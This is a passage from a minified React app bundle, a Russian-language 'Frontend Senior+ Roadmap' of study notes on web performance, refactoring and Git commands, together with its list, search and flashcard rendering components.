• **TTFB (Time To First Byte)** — время до первого байта ответа
• **TTI (Time To Interactive)** — когда страница полностью интерактивна`},{name:"Механизмы уменьшения размера бандла, CDN",level:"3",content:`**Уменьшение бандла:**
• **Tree shaking** — удаление неиспользуемого кода (ES modules)
• **Code splitting** — разделение на чанки (React.lazy, dynamic import)
• **Minification** — сжатие кода (Terser)
• **Compression** — gzip, Brotli
• **Анализ бандла** — webpack-bundle-analyzer, source-map-explorer

**CDN (Content Delivery Network):**
Сеть серверов по всему миру. Ресурсы раздаются с ближайшего сервера → меньше latency.
Кэширование на edge-серверах. Защита от DDoS.

**Оптимизация изображений (критично для LCP):**
• Использовать **WebP/AVIF** вместо JPEG/PNG (–25-50% размера)
• **srcset + sizes** — браузер сам выбирает нужный размер, не грузит лишнего
• **loading="lazy"** — для изображений below the fold
• **decoding="async"** — не блокирует main thread при декодировании
• CDN с auto-format (Cloudinary, imgix — автоматически конвертируют в WebP/AVIF)
\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    srcset="hero-400.jpg 400w, hero-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 800px"
    loading="eager"
    fetchpriority="high"
    alt="..."
  />
</picture>
\`\`\`
**fetchpriority="high"** — для LCP-изображения (выше preload в очереди загрузки).`},{name:"Lazy-loading, оптимизация критичного пути",level:"4",content:`**Critical Rendering Path:** HTML → DOM + CSSOM → Render Tree → Layout → Paint.

**Оптимизация:**
• Inline critical CSS (above-the-fold)
• Defer non-critical CSS
• Lazy-load изображений: \`loading="lazy"\`
• Lazy-load компонентов: React.lazy + Suspense
• Минимизировать блокирующие ресурсы
• Preload критических ресурсов

**Intersection Observer:**
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(e => { if (e.isIntersecting) loadImage(e.target); });
});
\`\`\``},{name:"Метрики серверной производительности",level:"4",content:`**TTFB** — время до первого байта. Зависит от сервера, БД, сети.
**Server Response Time** — время обработки запроса.
**Throughput** — количество запросов в секунду.
**Error Rate** — процент ошибочных ответов.

**Мониторинг:** New Relic, DataDog, Prometheus + Grafana.

**Оптимизация:** кэширование (Redis), CDN, оптимизация запросов к БД, horizontal scaling.`}]},{id:"refactoring",title:"РЕФАКТОРИНГ",icon:"🔧",color:"#8D6E63",topics:[{name:"Правила работы с комментариями при рефакторинге",level:"2",content:`**Хорошие комментарии:**
• Объясняют ПОЧЕМУ, а не ЧТО
• TODO / FIXME / HACK с обоснованием
• JSDoc для публичных API
• Регулярные выражения и сложные алгоритмы

**Плохие комментарии:**
• Описывают очевидный код
• Устаревшие (не обновлены при рефакторинге)
• Закомментированный код (удаляй, git помнит)

**Правило:** если код требует комментария — сначала попробуй сделать код понятнее (переименовать, выделить функцию).`},{name:"Основные принципы рефакторинга",level:"3",content:`**Рефакторинг** — изменение внутренней структуры без изменения поведения.

**Принципы:**
• Маленькие шаги + тесты после каждого шага
• Не менять поведение и рефакторить одновременно
• Тесты — safety net (без тестов рефакторинг рискован)
• Роль тестов при рефакторинге — они ДОЛЖНЫ проходить после каждого изменения

**Цели рефакторинга:** улучшить читаемость, убрать дублирование, упростить поддержку, подготовить к новой фиче.`},{name:"Признаки грязного кода",level:"3",content:`**Code Smells:**
• **Длинные функции/методы** (> 20-30 строк)
• **Дублирование кода**
• **Магические числа** (42 вместо MAX_RETRIES)
• **Глубокая вложенность** (if внутри if внутри if)
• **Большие классы / God Object** (один класс делает всё)
• **Feature Envy** — метод больше работает с чужими данными, чем со своими
• **Длинные списки параметров** (> 3 — используй объект)
• **Мёртвый код** — недостижимый или неиспользуемый
• **Shotgun Surgery** — одно изменение требует правок в 10 местах`},{name:"Применять различные методы рефакторинга",level:"3",content:`**Извлечение метода:**
\`\`\`js
// До
function process() { /* 50 строк */ }

// После
function process() {
  validate();
  transform();
  save();
}
\`\`\`

**Извлечение переменной** — сложное выражение → именованная переменная.
**Инкапсуляция полей** — прямой доступ → геттеры/сеттеры.
**Разбиение условного оператора** — сложный if → функции с говорящими именами.
**Замена магических чисел** — константы с понятным именем.
**Inline метод** — обратное извлечению, если метод тривиален.`},{name:"Понимает текущий бэклог технического развития проекта",level:"4",content:`**Технический долг (Tech Debt)** — осознанные или случайные компромиссы в коде.

**Бэклог тех. развития:**
• Обновление зависимостей
• Миграция на новые версии фреймворков
• Покрытие тестами критических путей
• Оптимизация производительности
• Улучшение CI/CD
• Документация архитектурных решений (ADR)

**Senior-ответственность:** видеть картину целиком, приоритизировать тех. долг, обосновывать бизнесу время на рефакторинг, планировать миграции.`}]},{id:"git",title:"GIT",icon:"📦",color:"#F4511E",topics:[{name:"Базовые команды: pull, push, commit, fetch, add, clone",level:"2",content:`**Три зоны:**
Рабочая директория → git add → Staging area → git commit → Repository

\`\`\`bash
git status          # статус файлов
git add file.js     # добавить файл в staging
git add .           # добавить все
git commit -m "msg" # зафиксировать
git push            # отправить на remote
git pull            # fetch + merge
git fetch           # скачать без merge (безопасно)
git clone <url>     # клонировать репо
\`\`\`
fetch vs pull: fetch скачивает изменения, но не применяет. pull = fetch + merge.

**init + config:**
\`\`\`bash
git init                               # инициализировать репо
git config --global user.name "Alex"   # имя для коммитов
git config --global user.email "..."   # email
git config --global core.editor vim    # редактор
git config --list                      # все настройки
\`\`\``},{name:"branch, merge, remote",level:"2",content:`**branch:**
\`\`\`bash
git branch              # список веток
git branch -a           # все включая remote
git branch feature      # создать ветку
git branch -d feature   # удалить ветку
git branch -m old new   # переименовать

git switch feature      # переключиться (Git 2.23+)
git switch -c feature   # создать и переключиться
\`\`\`

**merge:**
\`\`\`bash
git merge feature         # влить feature в текущую ветку
git merge --no-ff feature # всегда создавать merge коммит
git merge --abort         # отменить merge при конфликте
\`\`\`
Fast-forward — когда main не уходил вперёд, Git просто двигает указатель, merge коммита нет.
--no-ff — всегда создаёт merge коммит, видно что была ветка.

**remote:**
\`\`\`bash
git remote -v                      # список remote
git remote add origin https://...  # добавить
git remote remove origin           # удалить
git remote rename origin upstream  # переименовать

git fetch origin       # скачать без merge
git pull origin main   # fetch + merge
\`\`\``},{name:"amend, fixup, revert, cherry-pick, stash, rebase, .gitignore",level:"3",content:`**amend:**
\`\`\`bash
git commit --amend -m "новое сообщение"  # изменить последний коммит
git commit --amend --no-edit             # добавить файлы без смены сообщения
\`\`\`
⚠️ Переписывает SHA коммита. Если уже запушен — нужен git push --force-with-lease.

**stash:**
\`\`\`bash
git stash                  # сохранить изменения
git stash save "описание"  # с описанием
git stash list             # список всех stash
git stash pop              # применить последний и удалить
git stash apply stash@{2}  # применить конкретный
git stash drop             # удалить последний
git stash clear            # удалить все
\`\`\`

**revert vs reset:**
\`\`\`bash
git revert abc123         # новый коммит отменяющий abc123 (безопасно для remote)

git reset --soft HEAD~1   # коммит удалён, изменения в staging
git reset --mixed HEAD~1  # коммит удалён, изменения в рабочей директории
git reset --hard HEAD~1   # коммит и изменения удалены полностью
\`\`\`
Правило: reset только для локальных коммитов. revert когда коммит уже в remote.

**cherry-pick:**
\`\`\`bash
git cherry-pick abc123          # перенести один коммит
git cherry-pick abc123..def456  # диапазон коммитов
\`\`\`
Используется для хотфиксов — перенести исправление бага с одной ветки на другую.

**rebase:**
\`\`\`bash
git rebase main          # перебазировать текущую ветку на main
git rebase -i HEAD~3     # интерактивный rebase последних 3 коммитов
git rebase --abort       # отменить rebase
git rebase --continue    # продолжить после разрешения конфликта
\`\`\`
⚠️ Переписывает историю. Нельзя делать на публичных ветках которые используют другие.

**fixup:**
\`\`\`bash
git commit --fixup abc123             # создать коммит-исправление
git rebase -i --autosquash HEAD~5     # автоматически склеить fixup коммиты
\`\`\`

**.gitignore** — файлы которые git игнорирует (node_modules, .env, dist).`},{name:"log, diff, reflog, tag",level:"3",content:`**log:**
\`\`\`bash
git log --oneline --graph   # самый частый вариант
git log -n 5                # последние 5 коммитов
git log --author="Alex"     # коммиты автора
git log --since="2 weeks"   # за период
git log file.js             # история файла
\`\`\`

**diff:**
\`\`\`bash
git diff                   # изменения не в staging
git diff --staged          # изменения в staging
git diff main feature      # разница между ветками
git diff abc123 def456     # разница между коммитами
\`\`\`

**reflog:**
\`\`\`bash
git reflog               # история всех перемещений HEAD
git reset --hard abc123  # восстановить потерянный коммит
\`\`\`
Хранит историю ~90 дней. Страховка от reset --hard.

**tag:**
\`\`\`bash
git tag v1.0.0                   # lightweight тег
git tag -a v1.0.0 -m "Release"  # annotated тег (предпочтительно)
git push origin v1.0.0           # запушить тег
git push origin --tags           # запушить все теги
git tag -d v1.0.0                # удалить тег
\`\`\``},{name:"hooks",level:"4",content:`**Git Hooks** — скрипты в .git/hooks/ выполняющиеся автоматически при git командах.

**Основные хуки:**
• **pre-commit** — перед коммитом (линтинг, форматирование)
• **commit-msg** — проверка формата сообщения
• **pre-push** — перед push (тесты)

**Husky** — шарит хуки между разработчиками через package.json:
\`\`\`json
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "pre-push": "npm test"
    }
  }
}
\`\`\`
**lint-staged** — запускает линтер только на изменённых файлах.`},{name:"switch, restore",level:"4",content:`Новые команды (Git 2.23+), заменяющие перегруженный checkout:

\`\`\`bash
git switch feature         # переключить ветку
git switch -c feature      # создать и переключить

git restore file.js              # восстановить файл из последнего коммита
git restore --staged file.js     # убрать файл из staging
\`\`\`

checkout делал слишком много (переключение веток + откат файлов). switch и restore — чёткое разделение обязанностей.`},{name:"Способы оптимизации рабочего пространства Git, git-lfs, сабмодули",level:"4",content:`**git-lfs (Large File Storage):**
Для больших бинарных файлов (видео, дизайн, скриншоты). В репозитории хранится указатель, файл — на LFS сервере.
\`\`\`bash
git lfs install
git lfs track "*.png"
git lfs track "*.psd"
git add .gitattributes
\`\`\`

**Субмодули:**
Вложенный git-репозиторий внутри основного. Для переиспользования библиотек между проектами.
\`\`\`bash
git submodule add https://github.com/org/lib  # добавить
git submodule init                             # инициализировать
git submodule update                           # обновить
git clone --recurse-submodules https://...    # клонировать с субмодулями
\`\`\`
Минус — сложность синхронизации в команде.

**Shallow clone:**
\`\`\`bash
git clone --depth 1 <url>  # только последний коммит (быстрее для CI)
\`\`\``},{name:"worktree",level:"4",content:`**git worktree** — несколько рабочих директорий одного репо одновременно. Позволяет работать в нескольких ветках без stash и переключений.

\`\`\`bash
git worktree add ../hotfix main  # создать папку с веткой main
git worktree list                # список worktree
git worktree remove ../hotfix    # удалить
\`\`\`

Кейсы: срочный hotfix без прерывания текущей работы, сравнение двух веток бок о бок, запуск тестов на одной ветке пока работаешь на другой.`}]}],Dt=[...If,...Af],Ff=[];Dt.forEach(e=>{e.topics.forEach(t=>{t.content&&Ff.push({section:e.title,sectionColor:e.color,topic:t.name,level:t.level,content:t.content,score:t.score??null})})});function zf(e,t){if(!t)return e;const n=e.toLowerCase().indexOf(t.toLowerCase());return n===-1?e:y.jsxs(y.Fragment,{children:[e.slice(0,n),y.jsx("mark",{className:"search-highlight",children:e.slice(n,n+t.length)}),e.slice(n+t.length)]})}function rc({topic:e,sectionColor:t,highlight:n,defaultOpen:r=!1}){const[o,l]=Oe.useState(r),i=to[e.level]||to[2];return y.jsxs("div",{className:"topic-row",children:[y.jsxs("button",{className:"topic-header",onClick:()=>l(!o),children:[y.jsx("span",{className:"topic-chevron",children:o?"▾":"▸"}),y.jsx("span",{className:"topic-name",children:n?zf(e.name,n):e.name}),y.jsxs("span",{className:"topic-badges",children:[e.score!=null&&y.jsxs("span",{className:"topic-score",title:"Оценка",children:[e.score,"/5"]}),y.jsxs("span",{className:"topic-level",style:{background:i.color+"22",color:i.color,borderColor:i.color+"44"},children:[e.level," — ",i.label]})]})]}),o&&y.jsx("div",{className:"topic-content",children:y.jsx(oc,{text:e.content})})]})}function oc({text:e}){if(!e)return y.jsx("p",{className:"placeholder",children:"Контент будет добавлен позже"});const t=e.split(`
`),n=[];let r=!1,o=[],l=0;return t.forEach((i,s)=>{if(i.startsWith("```")){r?(n.push(y.jsx("pre",{children:o.join(`
`)},l++)),o=[],r=!1):r=!0;return}if(r){o.push(i);return}if(i.trim()===""){n.push(y.jsx("div",{className:"spacer"},l++));return}let a=i.replace(/\*\*(.+?)\*\*/g,"<strong>$1</strong>").replace(/`([^`]+)`/g,"<code>$1</code>").replace(/^• /,"‣ ");n.push(y.jsx("p",{className:"content-line",dangerouslySetInnerHTML:{__html:a}},l++))}),r&&o.length&&n.push(y.jsx("pre",{children:o.join(`
`)},l++)),y.jsx("div",{className:"formatted-content",children:n})}function Hf({section:e,defaultCollapsed:t=!1}){const[n,r]=Oe.useState(t),o=e.topics.length,l=e.topics.filter(s=>s.score!=null),i=l.length?(l.reduce((s,a)=>s+a.score,0)/l.length).toFixed(1):null;return y.jsxs("div",{className:"section-block",children:[y.jsxs("button",{className:"section-header",onClick:()=>r(!n),style:{"--accent":e.color},children:[y.jsxs("div",{className:"section-left",children:[y.jsx("span",{className:"section-icon",children:e.icon}),y.jsxs("div",{children:[y.jsx("h2",{className:"section-title",children:e.title}),y.jsxs("span",{className:"section-meta",children:[o," тем",i?` · Средняя: ${i}/5`:""]})]})]}),y.jsx("span",{className:"section-chevron",children:n?"▸":"▾"})]}),!n&&y.jsx("div",{className:"section-topics",children:e.topics.map((s,a)=>y.jsx(rc,{topic:s,sectionColor:e.color},a))})]})}function Uf({query:e,sections:t}){const n=e.toLowerCase(),r=[];return t.forEach(o=>{const l=o.topics.filter(i=>i.name.toLowerCase().includes(n)||i.content&&i.content.toLowerCase().includes(n));l.length>0&&r.push({section:o,topics:l})}),r.length===0?y.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",e,"»"]}):y.jsx(y.Fragment,{children:r.map(({section:o,topics:l})=>y.jsxs("div",{className:"section-block",children:[y.jsx("div",{className:"section-header",style:{"--accent":o.color},children:y.jsxs("div",{className:"section-left",children:[y.jsx("span",{className:"section-icon",children:o.icon}),y.jsxs("div",{children:[y.jsx("h2",{className:"section-title",children:o.title}),y.jsxs("span",{className:"section-meta",children:[l.length," совпадений"]})]})]})}),y.jsx("div",{className:"section-topics",children:l.map((i,s)=>y.jsx(rc,{topic:i,sectionColor:o.color,highlight:e,defaultOpen:!0},s))})]},o.id))})}function Wf({sections:e}){const[t,n]=Oe.useState("all"),[r,o]=Oe.useState(0),[l,i]=Oe.useState(!1),s=[];e.forEach(p=>{p.topics.forEach(h=>{h.content&&(t==="all"||t===p.id)&&s.push({...h,sectionTitle:p.title,sectionIcon:p.icon,sectionColor:p.color})})});const a=s[r];if(!a)return y.jsx("p",{children:"Нет карточек"});const c=to[a.level]||to[2];return y.jsxs("div",{className:"flashcard-mode",children:[y.jsxs("div",{className:"flash-filter",children:[y.jsxs("select",{value:t,onChange:p=>{n(p.target.value),o(0),i(!1)},children:[y.jsx("option",{value:"all",children:"Все разделы"}),e.map(p=>y.jsxs("option",{value:p.id,children:[p.icon," ",p.title]},p.id))]}),y.jsxs("span",{className:"flash-counter",children:[r+1," / ",s.length]})]}),y.jsx("div",{className:`flash-card ${l?"flipped":""}`,onClick:()=>i(!l),children:l?y.jsx("div",{className:"flash-back",children:y.jsx(oc,{text:a.content})}):y.jsxs("div",{className:"flash-front",children:[y.jsxs("span",{className:"flash-section",style:{color:a.sectionColor},children:[a.sectionIcon," ",a.sectionTitle]}),y.jsx("span",{className:"flash-level",style:{color:c.color},children:c.label}),y.jsx("h3",{className:"flash-question",children:a.name}),y.jsx("span",{className:"flash-hint",children:"Нажми, чтобы увидеть ответ"})]})}),y.jsxs("div",{className:"flash-nav",children:[y.jsx("button",{disabled:r===0,onClick:()=>{o(p=>p-1),i(!1)},children:"← Назад"}),y.jsx("button",{onClick:()=>{o(Math.floor(Math.random()*s.length)),i(!1)},children:"🎲 Случайная"}),y.jsx("button",{disabled:r>=s.length-1,onClick:()=>{o(p=>p+1),i(!1)},children:"Далее →"})]})]})}function Vf(){const[e,t]=Oe.useState("roadmap"),[n,r]=Oe.useState("list"),[o,l]=Oe.useState(""),i=Dt.reduce((a,c)=>a+c.topics.length,0),s=e==="roadmap"&&o.trim().length>0;return y.jsxs("div",{className:"app",children:[y.jsxs("header",{className:"app-header",children:[y.jsxs("div",{className:"header-content",children:[y.jsx("h1",{className:"app-title",children:"Frontend Senior+ Roadmap"}),y.jsxs("p",{className:"app-sub",children:[Dt.length," разделов · ",i," тем"]})]}),y.jsxs("div",{className:"header-controls",children:[y.jsxs("nav",{className:"tabs",children:[y.jsx("button",{className:`tab ${e==="roadmap"?"active":""}`,onClick:()=>{t("roadmap"),l("")},children:"📋 Темы"}),y.jsx("button",{className:`tab ${e==="cards"?"active":""}`,onClick:()=>{t("cards"),l("")},children:"🃏 Карточки"})]}),e==="roadmap"&&y.jsxs("div",{className:"view-toggle",children:[y.jsx("button",{className:`view-btn ${n==="list"?"active":""}`,onClick:()=>r("list"),title:"Список",children:y.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[y.jsx("rect",{x:"1",y:"2",width:"14",height:"2",rx:"1"}),y.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),y.jsx("rect",{x:"1",y:"12",width:"14",height:"2",rx:"1"})]})}),y.jsx("button",{className:`view-btn ${n==="grid"?"active":""}`,onClick:()=>r("grid"),title:"Сетка",children:y.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[y.jsx("rect",{x:"1",y:"1",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"9",y:"1",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"1",y:"9",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"9",y:"9",width:"6",height:"6",rx:"1"})]})})]})]}),e==="roadmap"&&y.jsxs("div",{className:"search-bar",children:[y.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:y.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),y.jsx("input",{type:"search",placeholder:"Поиск по темам...",value:o,onChange:a=>l(a.target.value),className:"search-input"}),o&&y.jsx("button",{className:"search-clear",onClick:()=>l(""),title:"Очистить",children:"✕"})]})]}),y.jsx("main",{className:`app-main ${e==="roadmap"&&!s&&n==="grid"?"view-grid":""}`,children:e==="roadmap"?s?y.jsx(Uf,{query:o.trim(),sections:Dt}):Dt.map(a=>y.jsx(Hf,{section:a,defaultCollapsed:n==="grid"},a.id)):y.jsx(Wf,{sections:Dt})},s?`search-${o}`:n)]})}Go.createRoot(document.getElementById("root")).render(y.jsx(Cc.StrictMode,{children:y.jsx(Vf,{})}));
